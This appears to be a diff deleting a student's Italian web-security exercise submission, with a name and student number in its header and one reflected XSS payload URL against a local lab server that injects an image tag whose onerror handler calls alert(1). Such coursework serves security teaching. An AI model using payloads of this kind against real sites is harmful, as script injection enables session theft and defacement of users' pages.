@@ -1,9 +1,0 @@
-# Nome: Davide Chirichella
-# Matricola: 0001071414
-# Esercizio: web vulnerabilities GG MM AAAA
-
-# ==============================================================================
-
-Payload: http://172.17.0.2/xss/xss_exam.php?name=%3Cimg%20src=%22ciao%22%20onerror=%22alert(1)%22%3E%3C/img%3E
-
-# ==============================================================================
